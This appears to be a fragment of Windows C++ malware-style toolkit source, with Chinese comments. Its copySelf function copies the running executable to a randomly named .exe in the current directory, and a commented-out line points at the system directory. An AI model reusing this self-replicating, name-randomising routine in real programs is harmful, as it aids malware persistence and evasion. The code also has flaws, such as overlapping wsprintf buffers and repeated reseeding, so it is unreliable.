#include "stdafx.h"
#include "ToolKit.h"
#include "libsysaux.h"

#define DIST_DIR "./"

//保存随机命名程序的路径

//生成随机字母
int CToolKit::SEU_RandEx(int min, int max)
{
	if (min == max)
		return min;

	srand(GetTickCount()); //种子要不一样
	int seed = rand() + 3;

	return seed % (max - min + 1) + min;
}

BOOL CToolKit::copySelf()
{
	TCHAR currentFullPath[MAX_PATH];
	TCHAR moduleName[MAX_PATH];
	TCHAR tempPath[MAX_PATH];

/////////////

	GetTempPath(MAX_PATH, tempPath);
	//GetSystemDirectory(tempPath, MAX_PATH);
	wprintf(tempPath);

	GetCurrentDirectory(MAX_PATH, currentFullPath);	//先放在当前目录吧
	wsprintf(currentFullPath, L"%s\\X%cm%cr%c%c%c.exe", currentFullPath, SEU_RandEx('A','Z'),
					SEU_RandEx('b','y'), SEU_RandEx('c','x'), SEU_RandEx('D','W'), SEU_RandEx('e','v'));
	//本来想着都是az 随机的发现会被编译器优化成一样的
	

	GetModuleFileName(NULL, moduleName, MAX_PATH);	//取得当前文件的全路径
	wsprintf(moduleName, L"%s", moduleName);

	wprintf(currentFullPath);
	wprintf(moduleName);
	
	 
	 if (!CopyFile(moduleName, currentFullPath, FALSE))
	 {
		 printf("[-] Copy file failed! \n");
		 return FALSE;
	 }
	return TRUE;
}